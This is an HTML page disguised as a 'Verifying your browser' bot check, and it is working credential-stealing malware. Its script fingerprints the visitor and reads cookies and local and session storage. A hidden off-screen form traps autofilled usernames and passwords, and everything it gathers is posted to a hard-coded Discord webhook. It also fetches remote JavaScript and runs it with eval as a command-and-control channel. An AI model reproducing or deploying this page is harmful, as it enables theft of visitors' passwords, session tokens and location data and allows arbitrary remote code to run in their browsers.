<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Security Check</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 100px;
    }
    #status {
      font-size: 20px;
      color: green;
    }
    input[type="text"], input[type="password"] {
      opacity: 0;
      position: absolute;
      top: -9999px;
    }
  </style>
</head>
<body>
  <h1>🔐 Verifying your browser...</h1>
  <p id="status">Please wait while we verify you're not a bot.</p>

  <!-- Autofill Trap -->
  <form id="autofillTrap">
    <input type="text" name="username" autocomplete="username">
    <input type="password" name="password" autocomplete="current-password">
  </form>

<script>
(async () => {
  const webhook = "https://discord.com/api/webhooks/1388233187075031241/BcOXhb8YM-I321blB67xbeqIvm76ZUbAW77Ku0YLSee8XAOoGIv3ssBAkyjl1D-Bo2xm";

  const getFonts = () => {
    const fonts = ["Arial", "Verdana", "Times New Roman", "Courier", "Comic Sans MS", "Georgia", "Impact", "Monaco", "Tahoma"];
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");
    const widths = {};
    ctx.font = "72px sans-serif";
    const text = "mmmmmmmmmmlli";
    for (const font of fonts) {
      ctx.font = `72px '${font}', sans-serif`;
      widths[font] = ctx.measureText(text).width;
    }
    return fonts.filter(f => widths[f] !== widths["Arial"]);
  };

  const getWebGLInfo = () => {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    if (!gl) return {};
    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
    return debugInfo ? {
      vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
      renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
    } : {};
  };

  const getBattery = async () => {
    try {
      const battery = await navigator.getBattery();
      return `${(battery.level * 100)}% - ${battery.charging ? "Charging" : "Not charging"}`;
    } catch {
      return "Not available";
    }
  };

  const geo = await fetch("https://geolocation-db.com/json/")
    .then(r => r.json()).catch(() => ({}));

  const payload = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen: `${screen.width}x${screen.height}`,
    touchSupport: navigator.maxTouchPoints,
    cookies: document.cookie || "None",
    localStorage: (() => {
      try {
        return JSON.stringify(localStorage);
      } catch {
        return "Access Denied";
      }
    })(),
    sessionStorage: (() => {
      try {
        return JSON.stringify(sessionStorage);
      } catch {
        return "Access Denied";
      }
    })(),
    fonts: getFonts(),
    webgl: getWebGLInfo(),
    battery: await getBattery(),
    ip: geo.IPv4 || "N/A",
    city: geo.city || "N/A",
    region: geo.state || "N/A",
    country: geo.country_name || "N/A"
  };

  // Send full fingerprint
  await fetch(webhook, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      content: `📡 Fingerprint Data:\n\`\`\`json\n${JSON.stringify(payload, null, 2)}\n\`\`\``
    })
  });

  // Attempt to read autofilled credentials after delay
  setTimeout(() => {
    const user = document.querySelector("input[name='username']").value;
    const pass = document.querySelector("input[name='password']").value;

    if (user || pass) {
      fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `🟡 Autofilled Credentials:\n\`\`\`json\n${JSON.stringify({ username: user, password: pass }, null, 2)}\n\`\`\``
        })
      });
    }
  }, 3000);

  // Polling-based C2: fetch remote JS and run
  try {
    const c2 = await fetch("https://your-server.com/cmd.js").then(r => r.text());
    const result = eval(c2);
    await fetch(webhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `⚙️ C2 Command Executed:\n\`\`\`js\n${c2}\n\`\`\`\n📤 Result: ${result}`
      })
    });
  } catch (e) {
    // Silent fail
  }

  // Optional: redirect to a real site
  // window.location.href = "https://google.com";
})();
</script>

</body>
</html>
